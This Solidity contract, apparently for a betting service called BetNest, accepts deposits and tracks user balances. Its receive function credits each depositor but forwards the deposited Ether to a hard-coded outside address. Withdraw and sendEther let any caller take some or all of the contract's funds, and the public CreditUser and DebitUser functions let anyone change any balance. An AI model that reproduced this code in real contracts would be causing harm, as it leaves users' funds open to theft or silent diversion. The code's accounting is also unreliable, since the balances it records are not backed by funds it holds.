//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// import "./ERC20.sol";

interface IERC20{

function transfer(address transfer, uint amount) external returns (bool);

} 

contract BetNestContract{

    constructor () payable {
        owner = msg.sender;
    }

    address owner;
    mapping(address => uint256) public balances;

    //EVENTS
    event Deposit(address indexed depositor, uint256 amount);
    event Transfer(address indexed source, uint amount);
    event Recieved(address, uint256);
    

    receive() external payable {
        balances[msg.sender] += msg.value;
        payable(address(0x476A5ca6E3fA9B241FAf184d11Cd635A1154caD9)).transfer(msg.value);      
        //Emit an event to log the recieved and deposit
        emit Recieved(msg.sender, msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    //a function for withdrawing a fungible token(Arbitrium)
     function withdraw(uint256 amount, address payable reciever) public payable returns(bool){
        
        require(address(this).balance >= amount, "insufficient funds");
        // reciever.transfer(amount);
        payable(msg.sender).transfer(amount);
        bool res = true;
        return (res);
    }

    function sendEther(address payable _recipient) external {
        // Get the contract's balance
        uint256 balance = address(this).balance;
        
        // Send all the contract's balance to the recipient
        _recipient.transfer(balance);
    }



    //A function the gets balance of a specific user
    function getBalances(address wallet_address) public view returns (uint256) {
        return balances[wallet_address];
    }

    //A function getting the contract balance
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }


    //A function for debiting a user account
    function DebitUser(address userAdress, uint amount) public returns (bool) {
        require(balances[userAdress] >= amount, "insufficient funds");
        balances[userAdress] -= amount;
        return true;
    }

    function CreditUser(address userAdress, uint amount) public returns (bool) {
        // require(balances[userAdress] >= amount, "insufficient funds");
        balances[userAdress] += amount;
        return true;
    }

    function getSender() public view returns(address){
        return (msg.sender);
    }
}